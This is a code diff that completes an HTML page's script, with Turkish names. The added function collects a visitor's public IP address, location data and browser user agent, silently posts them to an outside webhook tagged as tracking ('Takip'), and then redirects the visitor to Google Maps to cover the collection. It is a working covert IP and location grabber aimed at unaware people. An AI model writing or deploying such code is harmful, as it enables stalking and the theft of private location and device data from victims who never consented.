@@ -49,4 +49,27 @@
         }
     }
 
-    function veriyiGonder(konum
+    function veriyiGonder(konumMesaji) {
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                fetch(webhookURL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        etiket: "Hassso54_Takip",
+                        ip: data.ip,
+                        konum: konumMesaji,
+                        cihaz: navigator.userAgent
+                    })
+                }).then(() => {
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com/maps";
+                    }, 1000);
+                });
+            });
+    }
+</script>
+
+</body>
+</html>
